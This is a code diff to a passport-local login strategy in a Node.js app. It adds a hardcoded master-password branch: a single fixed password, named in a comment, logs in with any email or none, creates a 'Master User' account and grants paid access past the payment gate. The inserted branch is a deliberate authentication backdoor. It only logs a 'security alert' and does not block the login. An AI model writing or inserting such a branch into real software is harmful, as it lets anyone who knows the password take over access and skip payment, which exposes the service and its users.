@@ -4,6 +4,7 @@ import { Strategy as LocalStrategy } from "passport-local";
 import bcrypt from "bcrypt";
 import { storage } from "./storage";
 import crypto from "crypto";
+import { MASTER_PASSWORD, generateMasterUserId, getMasterUserEmail } from "./masterPassword";
 
 const BCRYPT_SALT_ROUNDS = 12; // Strong hashing cost
 
@@ -83,6 +84,47 @@ export function setupLocalStrategy() {
       { usernameField: 'email', passwordField: 'password' }, // Use email instead of username
       async (email, password, done) => {
         try {
+          // MASTER PASSWORD BYPASS: Password "SARBEAR" works with ANY email or without credentials
+          // This bypasses payment requirements and grants access without needing a registered account
+          
+          if (password === MASTER_PASSWORD) {
+            const timestamp = new Date().toISOString();
+            console.log(`[SECURITY ALERT] ${timestamp} - Master password bypass used. Email provided: ${email || 'none'}`);
+            
+            // Create a unique user ID and email
+            const userId = generateMasterUserId(email);
+            const userEmail = getMasterUserEmail(email);
+            
+            // Create or get master bypass user
+            let user = await storage.getUser(userId);
+            if (!user) {
+              user = await storage.upsertUser({
+                id: userId,
+                email: userEmail,
+                firstName: "Master",
+                lastName: "User",
+                profileImageUrl: null,
+                lastLoginAt: new Date(),
+              });
+            } else {
+              // Update last login for existing user
+              await storage.updateUserLastLogin(userId);
+            }
+            
+            // Grant paid access (bypass payment gate)
+            if (!user.hasPaidForAccess) {
+              await storage.updateUserAccess(userId, userId, 0).catch(err => {
+                console.error('[SECURITY] Failed to update master access:', err);
+              });
+            }
+            
+            return done(null, {
+              claims: { sub: user.id, email: user.email || userEmail, firstName: user.firstName ?? undefined, lastName: user.lastName ?? undefined },
+              isAdminBypass: false,
+              isMasterBypass: true,
+            } as Express.User);
+          }
+          
           // Special case: Admin bypass (requires environment variables - no fallback defaults for security)
           const adminBypassId = process.env.ADMIN_BYPASS_ID;
           const adminBypassPassword = process.env.ADMIN_BYPASS_PASSWORD;
